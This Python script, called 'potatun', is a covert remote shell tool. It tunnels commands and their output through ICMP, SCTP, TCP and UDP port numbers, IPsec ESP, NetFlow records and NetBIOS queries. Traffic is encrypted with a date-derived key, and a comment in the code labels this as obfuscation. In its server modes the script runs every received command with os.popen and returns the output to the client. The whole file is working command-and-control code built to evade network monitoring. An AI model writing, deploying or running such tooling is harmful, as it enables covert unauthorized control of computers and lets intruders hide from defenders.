#!/usr/bin/env python3

from __future__ import unicode_literals, print_function
from prompt_toolkit import PromptSession, HTML, print_formatted_text as print
from prompt_toolkit.styles import Style
from prompt_toolkit.shortcuts import ProgressBar

#Obfuscation.
from Crypto.Cipher import ARC2

import os
import base64
import time
import datetime
import hashlib
import argparse
from scapy.all import *

def shellExec(cmd):
   return os.popen(cmd).read()

def encrypt(m):
  dt = datetime.today()
  key = hashlib.sha1((str(dt.year) + str(dt.month) + str(dt.day)).encode('utf-8')).hexdigest()
  cipher = ARC2.new(key, ARC2.MODE_CFB, key[:8])
  return cipher.encrypt(m)

def decrypt(m):
  dt = datetime.today()
  key = hashlib.sha1((str(dt.year) + str(dt.month) + str(dt.day)).encode('utf-8')).hexdigest()
  cipher = ARC2.new(key, ARC2.MODE_CFB, key[:8])
  return cipher.decrypt(m)

def throwICMP(cmd, ip, intface):
  data = IP(dst=ip)/ICMP(id=0x0001, seq=0x1)/encrypt(cmd)
  send(data, iface=str(intface), verbose=True)

def stopICMP(x):
  if Raw in x:
    if len(x[Raw].load) > 1:
      return True
    else:
      return False
  else:
    return False

def listenICMP(intface):
  data = sniff(iface=str(intface), filter="inbound and icmp", stop_filter=stopICMP)
  return decrypt(data[len(data)-1][Raw].load).decode('utf-8')

def throwSCTP(cmd, ip, port, intface):
  data = IP(dst=ip)/SCTP(sport=RandNum(50000,60000), dport=int(port))/SCTPChunkData(data=encrypt(cmd))
  send(data, iface=str(intface), verbose=True)

def stopSCTP(x):
  if SCTP in x and SCTPChunkData in x:
    return True
  else:
    return False

def listenSCTP(intface, port):
  data = sniff(iface=str(intface), filter="inbound and sctp and dst port " + str(port), stop_filter=stopSCTP)
  return decrypt(data[0][SCTPChunkData].data).decode('utf-8')
  
def throwTCP(cmd, ip, port, intface):
  with ProgressBar(title="Sending TCPs..") as pb:
    for i in pb(cmd):
      send(IP(dst=ip)/TCP(sport=60000+ord(i), dport=int(port)), iface=str(intface), verbose=False)
      time.sleep(0.1)

  send(IP(dst=ip)/TCP(sport=59999, dport=int(port)), iface=str(intface), verbose=False)

def stopTCP(x):
  if x[TCP].sport == 59999:
    return True
  else:
    return False

def listenTCP(intface, port):
  pkts = sniff(iface=str(intface), filter="inbound and tcp and dst port "+str(port), stop_filter=stopTCP)
  o = ""
  for pkt in pkts:
    if pkt[TCP].sport == 59999:
      break
    o = o + str(chr(pkt[TCP].sport - 60000))
  return str(o)

def throwUDP(cmd, ip, port, intface):
  with ProgressBar(title="Sending UDPs..") as pb:
    for i in pb(cmd):
      send(IP(dst=ip)/UDP(sport=60000+ord(i), dport=int(port)), iface=str(intface), verbose=False)
      time.sleep(0.1)

  send(IP(dst=ip)/UDP(sport=59999, dport=int(port)), iface=str(intface), verbose=False)

def stopUDP(x):
  if x[UDP].sport == 59999:
    return True
  else:
    return False

def listenUDP(intface, port):
  pkts = sniff(iface=intface, filter="inbound and udp and dst port "+str(port), stop_filter=stopUDP)
  o = ""
  for pkt in pkts:
    if pkt[UDP].sport == 59999:
      break
    o = o + str(chr(pkt[UDP].sport - 60000))
  return str(o)

def throwIPSEC(cmd, ip, port, intface):
  dt = datetime.today()
  key = hashlib.sha1((str(dt.year) + str(dt.month) + str(dt.day)).encode('utf-8')).hexdigest()
  sa = SecurityAssociation(ESP, spi=0xc0ffeffe, crypt_algo='AES-CBC', crypt_key=key[-16:].encode('ISO-8859-1'))
  p = IP(Raw(IP(dst=ip)/TCP(sport=RandNum(50000,60000), dport=int(port))/Raw(cmd)))
  data = sa.encrypt(p)
  send(data, iface=str(intface), verbose=True)

def stopIPSEC(x):
  if IP in x and ESP in x:
    if x[ESP].spi == 0xc0ffeffe:
      return True
    else:
      return False
  else:
    return False

def listenIPSEC(intface):
  dt = datetime.today()
  key = hashlib.sha1((str(dt.year) + str(dt.month) + str(dt.day)).encode('utf-8')).hexdigest()
  sa = SecurityAssociation(ESP, spi=0xc0ffeffe, crypt_algo='AES-CBC', crypt_key=key[-16:].encode('ISO-8859-1'))
  data = sniff(iface=str(intface), filter="inbound and ip", stop_filter=stopIPSEC)  
  return (sa.decrypt(data[len(data)-1][IP])).load.decode('utf-8')

def throwNETFLOW(cmd, ip, port, intface):
  cmds = [cmd[i:i+10] for i in range(0, len(cmd), 10)]
  with ProgressBar(title="Sending Netflow..") as pb:
    for cmd in pb(cmds):
      base = IP(dst=ip)/UDP(sport=RandNum(50000,60000), dport=2055)/NetflowHeader(version=5)/NetflowHeaderV5(count=len(cmd))
      for i in cmd:
        base /= NetflowRecordV5(srcport=60000+ord(i), dstport=443, src=RandIP(), dst=RandIP(), dpkts=RandInt())
      send(base, iface=str(intface), verbose=False)
  
  base = IP(dst=ip)/UDP(sport=RandNum(50000,60000), dport=2055)/NetflowHeader(version=5)/NetflowHeaderV5(count=1)
  base /= NetflowRecordV5(srcport=59999, dstport=443, src=RandIP(), dst=RandIP(), dpkts=RandInt())
  send(base, iface=str(intface), verbose=False)

def stopNETFLOW(x):
  if NetflowHeader in x and NetflowRecordV5 in x:
    if x[NetflowRecordV5].srcport == 59999:
      return True
    else:
      return False
  else:
    return False

def listenNETFLOW(intface, port):
  pkts = sniff(iface=intface, filter="inbound and udp and dst port 2055", stop_filter=stopNETFLOW)
  o = ""
  for pkt in pkts:
    if NetflowHeader in pkt and NetflowRecordV5 in pkt:
      if pkt[NetflowHeaderV5].srcport == 59999:
          break
      for i in range(pkt[NetflowHeaderV5].count):
        o = o + str(chr(pkt[NetflowHeaderV5][i+1].srcport - 60000))

  return str(o)

def throwNETBIOS(cmd, ip, port, intface):
  cmd = encrypt(cmd)
  cmds = [cmd[i:i+15] for i in range(0, len(cmd), 15)]
  with ProgressBar(title="Sending Netbios..") as pb:
    for cmd in pb(cmds):
      base = IP(dst=ip)/UDP(sport=137, dport=137)/NBNSQueryRequest(QUESTION_NAME=cmd)
      send(base, iface=str(intface), verbose=False)
  
  base = IP(dst=ip)/UDP(sport=137, dport=137)/NBNSQueryRequest(QUESTION_NAME="BAMNBAMN")
  send(base, iface=str(intface), verbose=False)

def stopNETBIOS(x):
  if UDP in x and NBNSQueryRequest in x:
    if x[NBNSQueryRequest].QUESTION_NAME.strip(b' ') == b"BAMNBAMN":
      return True
    else:
      return False
  else:
    return False

def listenNETBIOS(intface, port):
  pkts = sniff(iface=intface, filter="inbound and udp and dst port 137", stop_filter=stopNETBIOS)
  o = b''
  for pkt in pkts:
    if UDP in pkt and NBNSQueryRequest in pkt:
      if pkt[NBNSQueryRequest].QUESTION_NAME.strip(b' ') == b"BAMNBAMN":
        break
      else:
        o = o + pkt[NBNSQueryRequest].QUESTION_NAME.strip(b' ')

  return decrypt(o).decode('utf-8')

def main(intface, ip, port, mode):
  session = PromptSession()
  our_style = Style.from_dict({
    '': '#884444',
  })

  if mode == "udp-c":
    while True:
      try:
        cmd = session.prompt('# ', style=our_style)
        throwUDP(cmd, ip, port, intface)
        time.sleep(1)
        print(HTML("<ansired><b>" + listenUDP(intface, port) + "</b></ansired>"))
        time.sleep(1)
      except KeyboardInterrupt:
        break
      except EOFError:
        break
    print('Exiting..')

  elif mode == "udp-s":
    while True:
      cmd = listenUDP(intface, port)
      data = shellExec(cmd)
      time.sleep(1)
      throwUDP(data, ip, port, intface)

  elif mode == "tcp-c":
    while True:
      try:
        cmd = session.prompt('# ', style=our_style)
        throwTCP(cmd, ip, port, intface)
        time.sleep(1)
        print(HTML("<ansired><b>" + listenTCP(intface, port) + "</b></ansired>"))
        time.sleep(1)
      except KeyboardInterrupt:
        break
      except EOFError:
        break
    print('Exiting..')

  elif mode == "tcp-s":
    while True:
      cmd = listenTCP(intface, port)
      data = shellExec(cmd)
      time.sleep(1)
      throwTCP(data, ip, port, intface)

  elif mode == "icmp-c":
    while True:
      try:
        cmd = session.prompt('# ', style=our_style)
        throwICMP(cmd, ip, intface)
        print(HTML("<ansired><b>" + listenICMP(intface) + "</b></ansired>"))
        time.sleep(1)
      except KeyboardInterrupt:
        break
      except EOFError:
        break
    print('Exiting..')

  elif mode == "icmp-s":
    while True:
      cmd = listenICMP(intface)
      data = shellExec(cmd)
      time.sleep(1)
      throwICMP(data, ip, intface)

  elif mode == "sctp-c":
    while True:
      try:
        cmd = session.prompt('# ', style=our_style)
        throwSCTP(cmd, ip, port, intface)
        print(HTML("<ansired><b>" + listenSCTP(intface, port) + "</b></ansired>"))
        time.sleep(1)
      except KeyboardInterrupt:
        break
      except EOFError:
        break
    print('Exiting..')

  elif mode == "sctp-s":
    while True:
      cmd = listenSCTP(intface, port)
      data = shellExec(cmd)
      time.sleep(1)
      throwSCTP(data, ip, port, intface)

  elif mode == "ipsec-c":
    while True:
      try:
        cmd = session.prompt('# ', style=our_style)
        throwIPSEC(cmd, ip, port, intface)
        print(HTML("<ansired><b>" + listenIPSEC(intface) + "</b></ansired>"))
        time.sleep(1)
      except KeyboardInterrupt:
        break
      except EOFError:
        break
    print('Exiting..')

  elif mode == "ipsec-s":
    while True:
      cmd = listenIPSEC(intface)
      data = shellExec(cmd)
      time.sleep(1)
      throwIPSEC(data, ip, port, intface)

  elif mode == "netflow-c":
    while True:
      try:
        cmd = session.prompt('# ', style=our_style)
        throwNETFLOW(cmd, ip, port, intface)
        print(HTML("<ansired><b>" + listenNETFLOW(intface, port) + "</b></ansired>"))
        time.sleep(2)
      except KeyboardInterrupt:
        break
      except EOFError:
        break
    print('Exiting..')

  elif mode == "netflow-s":
    while True:
      cmd = listenNETFLOW(intface, port)
      data = shellExec(cmd)
      time.sleep(2)
      throwNETFLOW(data, ip, port, intface)

  elif mode == "netbios-c":
    while True:
      try:
        cmd = session.prompt('# ', style=our_style)
        throwNETBIOS(cmd, ip, port, intface)
        print(HTML("<ansired><b>" + listenNETBIOS(intface, port) + "</b></ansired>"))
        time.sleep(2)
      except KeyboardInterrupt:
        break
      except EOFError:
        break
    print('Exiting..')

  elif mode == "netbios-s":
    while True:
      cmd = listenNETBIOS(intface, port)
      data = shellExec(cmd)
      time.sleep(2)
      throwNETBIOS(data, ip, port, intface)

if __name__ == "__main__":
  parser = argparse.ArgumentParser(description='potatun - an experimental packet tunnelling bind shell.')
  parser.add_argument('-i', type=str, help='send interface (eth0)')
  parser.add_argument('-t', type=str, help='send ip:port (10.10.10.1:443)')
  parser.add_argument('-m', type=str, help='tunnel mode (udp-c/udp-s, tcp-c/tcp-s, icmp-c/icmp-s, sctp-c/sctp-s, ipsec-c/ipsec-s, netflow-c/netflow-s, netbios-c/netbios-s)')
  args = parser.parse_args()
  if args.i and args.t and args.m:
    print("> Sending/Listening on: " + args.i)
    print("> Mode: " + args.m)
    print("> Target: " + args.t)
    main(args.i, args.t.split(":")[0], args.t.split(":")[1], args.m)
  else:
    parser.print_help()
